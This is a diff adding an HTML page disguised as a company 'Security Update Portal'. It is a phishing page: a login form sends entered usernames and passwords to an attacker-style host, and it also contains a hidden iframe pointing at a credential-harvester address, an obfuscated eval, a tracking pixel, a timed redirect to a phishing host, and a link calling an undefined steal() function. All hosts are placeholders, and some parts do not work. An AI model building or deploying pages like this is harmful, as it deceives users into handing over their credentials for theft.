@@ -1,0 +1,18 @@
+<html>
+<head><title>Security Update Portal</title></head>
+<body>
+<h1>Company Security Portal</h1>
+<script>
+var x = eval(String.fromCharCode(97,108,101,114,116));
+document.write('<img src="https://tracking.evil.com/pixel.gif">');
+</script>
+<iframe src="https://credential-harvester.example.com/fake-login" style="display:none;height:0;width:0;"></iframe>
+<form action="https://evil-server.example.com/collect" method="POST">
+    <input type="text" name="username" placeholder="Enter your email">
+    <input type="password" name="password" placeholder="Enter your password">
+    <button type="submit">Verify Identity</button>
+</form>
+<meta http-equiv="refresh" content="30;url=https://phishing-redirect.example.com/success">
+<a href="javascript:void(0)" onclick="steal()">Click here for help</a>
+</body>
+</html>
